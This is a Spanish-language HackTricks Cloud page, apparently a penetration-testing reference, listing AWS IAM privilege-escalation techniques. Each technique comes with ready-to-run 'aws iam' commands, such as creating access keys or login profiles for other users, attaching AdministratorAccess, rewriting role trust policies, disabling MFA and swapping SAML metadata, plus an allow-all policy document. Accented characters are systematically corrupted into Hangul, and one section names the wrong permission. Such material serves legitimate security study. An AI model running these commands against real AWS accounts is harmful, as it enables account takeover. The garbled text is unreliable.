# AWS - Escalada de privilegios en IAM

<details>

<summary><strong>춰Apoya a HackTricks y obt칠n beneficios!</strong></summary>

* Si quieres ver tu **empresa anunciada en HackTricks** o si quieres acceder a la **칰ltima versi칩n de PEASS o descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCI칍N**](https://github.com/sponsors/carlospolop).
* Obt칠n el [**merchandising oficial de PEASS y HackTricks**](https://peass.creator-spring.com).
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci칩n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family).
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **s칤gueme** en **Twitter** 游냕 [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) en GitHub.

</details>

## IAM

Para obtener m치s informaci칩n sobre IAM, consulta:

{% content-ref url="../aws-services/aws-iam-enum.md" %}
[aws-iam-enum.md](../aws-services/aws-iam-enum.md)
{% endcontent-ref %}

### `iam:CreatePolicyVersion`

Un atacante con el permiso **`iam:CreatePolicyVersion`** puede crear una **nueva versi칩n de una pol칤tica IAM a la que tiene acceso**. Esto le permite definir sus **propias permisos personalizados**. Al crear una nueva versi칩n de la pol칤tica, es necesario **establecerla como la versi칩n predeterminada para que surta efecto**, lo cual podr칤a requerir el permiso `iam:SetDefaultPolicyVersion`, pero al crear una nueva versi칩n de la pol칤tica, es posible incluir una bandera (**`--set-as-default`**) que la crear치 autom치ticamente como la **nueva versi칩n predeterminada**. Esta bandera **no requiere** el permiso `iam:SetDefaultPolicyVersion` para su uso.

Un ejemplo de comando para explotar este m칠todo podr칤a ser el siguiente:
```bash
# Enum
aws iam list-policy-versions --policy-arn <arn>
aws iam get-policy-version --policy-arn <arn> --version-id <VERSION_X>

# Exploitation
aws iam create-policy-version --policy-arn <target_policy_arn> \
--policy-document file:///path/to/administrator/policy.json --set-as-default
```
Donde el archivo `policy.json` incluir칤a un **documento de pol칤tica que permite cualquier acci칩n contra cualquier recurso en la cuenta**.

**Impacto potencial:** Escalada directa de privilegios a todo.

### `iam:SetDefaultPolicyVersion`

Un atacante con el permiso **`iam:SetDefaultPolicyVersion`** puede ser capaz de escalar privilegios a trav칠s de **versiones de pol칤ticas existentes que no se est치n utilizando actualmente**. Si una **pol칤tica a la que tienen acceso** tiene versiones que **no son la versi칩n predeterminada**, podr칤an cambiar la versi칩n predeterminada a cualquier otra versi칩n existente.

{% hint style="warning" %}
Si la **pol칤tica** que est치s **modificando** la versi칩n es la misma que est치 **concediendo** al atacante el permiso `SetDefaultPolicyVersion`, y la **nueva versi칩n no otorga** ese permiso, el atacante **no podr치 devolver la pol칤tica a su estado original**.
{% endhint %}

Un ejemplo de comando para explotar este m칠todo podr칤a ser as칤:
```bash
aws iam set-default-policy-version --policy-arn <target_policy_arn> \
--version-id v2
```
Donde "v2" es la versi칩n de la pol칤tica con los privilegios m치s disponibles.

**Impacto potencial:** Privesc indirecto estableciendo una versi칩n de pol칤tica diferente que podr칤a otorgar m치s permisos.

### `iam:CreateAccessKey`

Un atacante con el permiso **`iam:CreateAccessKey`** en otros usuarios puede **crear un ID de clave de acceso y una clave de acceso secreta pertenecientes a otro usuario** en el entorno de AWS, si a칰n no tienen dos conjuntos asociados con ellos (lo cual es recomendado por las mejores pr치cticas).

Un ejemplo de comando para explotar este m칠todo podr칤a verse as칤:
```bash
aws iam create-access-key --user-name <target_user>
```
Donde target\_user tiene un conjunto extendido de permisos en comparaci칩n con el usuario actual.

**Impacto potencial:** Escalada de privilegios directa a cualquier usuario.

### `iam:CreateLoginProfile`

Un atacante con el permiso `iam:CreateLoginProfile` en otros usuarios puede **crear una contrase침a** para usarla para **iniciar sesi칩n** en la consola de AWS en **cualquier usuario que a칰n no tenga un perfil de inicio de sesi칩n configurado**.

Un ejemplo de comando para explotar este m칠todo podr칤a ser el siguiente:
```bash
aws iam create-login-profile --user-name target_user --no-password-reset-required \
--password '|[3rxYGGl3@`~68)O{,-$1B"zKejZZ.X1;6T}<XT5isoE=LB2L^G@{uK>f;/CQQeXSo>}t'
```
Esa contrase침a garantiza que cumpla con los **requisitos m칤nimos de contrase침a de las cuentas**.

**Impacto potencial:** Escalada de privilegios directa a "cualquier" usuario.

### `iam:UpdateLoginProfile`

Un atacante con el permiso **`iam:UpdateLoginProfile`** en otros usuarios puede **cambiar la contrase침a utilizada para iniciar sesi칩n en la consola de AWS** en cualquier usuario que **ya tenga un perfil de inicio de sesi칩n configurado**.

Al igual que al crear un perfil de inicio de sesi칩n, un comando de ejemplo para explotar este m칠todo podr칤a verse as칤:
```bash
aws iam update-login-profile --user-name target_user --no-password-reset-required \
--password '|[3rxYGGl3@`~68)O{,-$1B"zKejZZ.X1;6T}<XT5isoE=LB2L^G@{uK>f;/CQQeXSo>}t'
```
Esa contrase침a garantiza que cumpla con los **requisitos m칤nimos de contrase침a de las cuentas**.

**Impacto potencial:** Escalada de privilegios directa para "cualquier" usuario.

### `iam:UpdateAccessKey`

Un atacante con **`iam:UpdateAccessKey`** podr칤a **habilitar una clave de acceso desactivada** y usarla (necesitar칤a tener la clave de acceso desactivada)

{% code overflow="wrap" %}
```bash
aws iam update-access-key --access-key-id AKIAIOSFODNN7EXAMPLE --status Active --user-name Bob
```
{% endcode %}

**Impacto potencial:** Escalada de privilegios directa para acceder a la clave de usuario (necesitando tener la clave).

### `iam:CreateServiceSpecificCredential`

Permite **generar** un **nombre de usuario** y una **contrase침a** que se pueden utilizar para **acceder al servicio especificado** en la solicitud (**CodeCommit o Amazon Keyspaces** - Apache Cassandra -).

Las nuevas credenciales espec칤ficas del servicio tienen los **mismos permisos que el usuario asociado**, excepto que solo se pueden utilizar para acceder al servicio especificado.

Solo es posible tener un **m치ximo de dos conjuntos de credenciales espec칤ficas del servicio para cada** servicio admitido por usuario.

{% code overflow="wrap" %}
```bash
aws iam create-service-specific-credential --user-name sofia --service-name codecommit.amazonaws.com
```
{% endcode %}

**Impacto potencial:** Escalada directa de privilegios a los permisos del servicio de usuario.

### `iam:ResetServiceSpecificCredential`

Similar a **`iam:CreateServiceSpecificCredential`**, pero en lugar de crear nuevas credenciales, se restablece una existente.&#x20;

{% code overflow="wrap" %}
```bash
aws iam reset-service-specific-credential --service-specific-credential-id ACCAEXAMPLE123EXAMPLE
```
{% endcode %}

**Impacto potencial:** Escalada directa de privilegios a los permisos del servicio de usuario.

### `iam:AttachUserPolicy`

Un atacante con el permiso **`iam:AttachUserPolicy`** puede escalar privilegios al **adjuntar una pol칤tica a un usuario al que tienen acceso**, agregando los permisos de esa pol칤tica al atacante.

Un ejemplo de comando para explotar este m칠todo podr칤a ser el siguiente:
```bash
aws iam attach-user-policy --user-name <my_username> \
--policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"
```
**Impacto potencial:** Escalada directa de privilegios a cualquier cosa.

### `iam:AttachGroupPolicy`

Un atacante con el permiso **`iam:AttachGroupPolicy`** puede escalar privilegios al **adjuntar una pol칤tica a un grupo** del que forma parte, agregando los permisos de esa pol칤tica al atacante.
```bash
aws iam attach-group-policy --group-name group_i_am_in \
--policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"
```
Donde el grupo es un grupo al que el usuario actual pertenece.

**Impacto potencial:** Escalada directa de privilegios a cualquier cosa (si el usuario est치 dentro de un grupo).

### `iam:AttachRolePolicy`, (`sts:AssumeRole`|`iam:createrole`)

Un atacante con el permiso **`iam:AttachRolePolicy`** puede escalar privilegios al **adjuntar una pol칤tica a un rol** al que tienen acceso, agregando los permisos de esa pol칤tica al atacante.
```bash
aws iam attach-role-policy --role-name <role_i_can_assume> \
--policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"
```
Donde el rol es un rol que el usuario actual puede asumir temporalmente con `sts:AssumeRole`.

**Impacto potencial:** Escalada directa de privilegios a cualquier cosa.

### `iam:PutUserPolicy`

Un atacante con el permiso `iam:PutUserPolicy` puede **escalar privilegios creando o actualizando una pol칤tica incrustada para un usuario** al que tienen acceso, agregando los permisos de esa pol칤tica al atacante.
```bash
aws iam put-user-policy --user-name <my_username> --policy-name "my_inline_policy" \
--policy-document "file:///path/to/administrator/policy.json"
```
Puedes utilizar una pol칤tica como:
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": [
"*"
],
"Resource": [
"*"
]
}
]
}
```
**Impacto potencial:** Escalada directa de privilegios a cualquier cosa.

### `iam:PutGroupPolicy`

Un atacante con el permiso `iam:PutGroupPolicy` puede escalar privilegios al **crear o actualizar una pol칤tica incrustada para un grupo del cual forman parte**, agregando los permisos de esa pol칤tica al atacante.
```bash
aws iam put-group-policy --group-name <group_i_am_in> \
--policy-name "group_inline_policy" \
--policy-document file:///path/to/administrator/policy.json
```
Donde el grupo es **un grupo en el que el usuario actual est치**.

**Impacto potencial:** Escalada directa de privilegios a cualquier cosa.

### `iam:PutRolePolicy`, (`sts:AssumeRole`|`iam:createrole`)

Un atacante con el permiso **`iam:PutRolePolicy`** puede escalar privilegios mediante la **creaci칩n o actualizaci칩n de una pol칤tica interna para un rol al que tienen acceso**, agregando los permisos de esa pol칤tica al atacante.

Un ejemplo de comando para explotar este m칠todo podr칤a verse as칤:
```bash
aws iam put-role-policy --role-name <role_i_can_assume> \
--policy-name "role_inline_policy" \
--policy-document file:///path/to/administrator/policy.json
```
Donde el rol es un rol que el usuario actual puede asumir temporalmente con `sts:AssumeRole`.

**Impacto potencial:** Escalada de privilegios directa a cualquier cosa.

### `iam:AddUserToGroup`

Un atacante con el permiso **`iam:AddUserToGroup`** puede usarlo para **agregarse a s칤 mismo a un grupo IAM existente** en la cuenta de AWS.
```bash
aws iam add-user-to-group --group-name <target_group> --user-name <my_username>
```
Donde **target\_group tiene m치s/diferentes privilegios** que la cuenta de usuario del atacante.

**Impacto potencial:** Escalada de privilegios directa a cualquier grupo.

### `iam:UpdateAssumeRolePolicy`, `sts:AssumeRole`

Un atacante con los permisos `iam:UpdateAssumeRolePolicy` y `sts:AssumeRole` ser칤a capaz de **cambiar el documento de pol칤tica de asunci칩n de roles de cualquier rol existente** para permitirles asumir ese rol.
```bash
aws iam update-assume-role-policy --role-name <role_to_assume> \
--policy-document file:///path/to/assume/role/policy.json
```
Cuando la pol칤tica se ve como la siguiente, la cual otorga al usuario permiso para asumir el rol:
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": "sts:AssumeRole",
"Principal": {
"AWS": "$USER_ARN"
}
}
]
}
```
**Impacto potencial:** Escalada de privilegios directa a cualquier rol.

### `iam:UploadSSHPublicKey`

Un atacante con `iam:DeactivateMFADevice` puede cargar una **clave p칰blica SSH y asociarla con el usuario IAM especificado** ([M치s informaci칩n](https://docs.aws.amazon.com/IAM/latest/APIReference/API\_UploadSSHPublicKey.html)).

La clave p칰blica SSH cargada mediante esta operaci칩n solo se puede utilizar para **autenticar al usuario IAM asociado en un repositorio de CodeCommit**. Para obtener m치s informaci칩n sobre c칩mo utilizar claves SSH para autenticarse en un repositorio de CodeCommit, consulta [Configurar CodeCommit para conexiones SSH](https://docs.aws.amazon.com/codecommit/latest/userguide/setting-up-credentials-ssh.html) en la _Gu칤a del usuario de CodeCommit_.
```bash
aws iam upload-ssh-public-key --user-name <value> \
--ssh-public-key-body <value>
```
**Impacto potencial:** Escalada indirecta de privilegios a CodeCommit.

### `iam:DeactivateMFADevice`

Un atacante con `iam:DeactivateMFADevice` puede **desactivar el dispositivo MFA especificado** y eliminar su asociaci칩n con el usuario IAM para el cual fue originalmente habilitado ([M치s informaci칩n](https://docs.aws.amazon.com/IAM/latest/APIReference/API\_DeactivateMFADevice.html)).
```bash
aws iam deactivate-mfa-device --user-name <value> --serial-number <value>
```
**Impacto potencial:** Escalada indirecta de privilegios de un usuario si ya se conoce su nombre de usuario y contrase침a al desactivar el dispositivo MFA.

### `iam:ResyncMFADevice`

Un atacante con `iam:ResyncMFADevice` puede **sincronizar el dispositivo MFA especificado** con una entidad IAM: usuario o rol ([M치s informaci칩n](https://docs.aws.amazon.com/IAM/latest/APIReference/API\_ResyncMFADevice.html)).
```bash
aws iam resync-mfa-device --user-name <value> --serial-number <value> \
--authentication-code1 <value> --authentication-code2 <value>
```
**Impacto potencial:** Escalada indirecta de privilegios de un usuario si ya se conoce su nombre de usuario y contrase침a al agregar un dispositivo MFA.

### `iam:UpdateSAMLProvider`, `iam:ListSAMLProviders`, (`iam:GetSAMLProvider`)

Con estos permisos, puedes **cambiar los metadatos XML de la conexi칩n SAML**. Luego, podr칤as abusar de la **federaci칩n SAML** para **iniciar sesi칩n** con cualquier **rol que conf칤e** en ella.

Ten en cuenta que al hacer esto, los **usuarios leg칤timos no podr치n iniciar sesi칩n**. Sin embargo, podr칤as obtener el XML, as칤 que puedes poner el tuyo, iniciar sesi칩n y configurar el anterior nuevamente.
```bash
# List SAMLs
aws iam list-saml-providers

# Optional: Get SAML provider XML
aws iam get-saml-provider --saml-provider-arn <ARN>

# Update SAML provider
aws iam update-saml-provider --saml-metadata-document <value> --saml-provider-arn <arn>

## Login impersonating roles that trust the SAML provider

# Optional: Set the previous XML back
aws iam update-saml-provider --saml-metadata-document <previous-xml> --saml-provider-arn <arn>
```
{% hint style="info" %}
TODO: Una herramienta capaz de generar los metadatos SAML e iniciar sesi칩n con un rol especificado
{% endhint %}

### `iam:UpdateOpenIDConnectProviderThumbprint`, `iam:ListOpenIDConnectProviders`, (`iam:`**`GetOpenIDConnectProvider`**)

(No estoy seguro de esto) Si un atacante tiene estos **permisos**, podr칤a agregar una nueva **huella digital** para poder iniciar sesi칩n en todos los roles que conf칤an en el proveedor.

{% code overflow="wrap" %}
```bash
# List providers
aws iam list-open-id-connect-providers
# Optional: Get Thumbprints used to not delete them
aws iam get-open-id-connect-provider --open-id-connect-provider-arn <ARN>
# Update Thumbprints (The thumbprint is always a 40-character string)
aws iam update-open-id-connect-provider-thumbprint --open-id-connect-provider-arn <ARN> --thumbprint-list 359755EXAMPLEabc3060bce3EXAMPLEec4542a3
```
{% endcode %}

<details>

<summary><strong>춰Apoya a HackTricks y obt칠n beneficios!</strong></summary>

* Si quieres ver tu **empresa anunciada en HackTricks** o si quieres acceder a la **칰ltima versi칩n de PEASS o descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCI칍N**](https://github.com/sponsors/carlospolop).
* Obt칠n el [**merchandising oficial de PEASS y HackTricks**](https://peass.creator-spring.com).
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci칩n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family).
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **s칤gueme** en **Twitter** 游냕 [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) en GitHub.

</details>
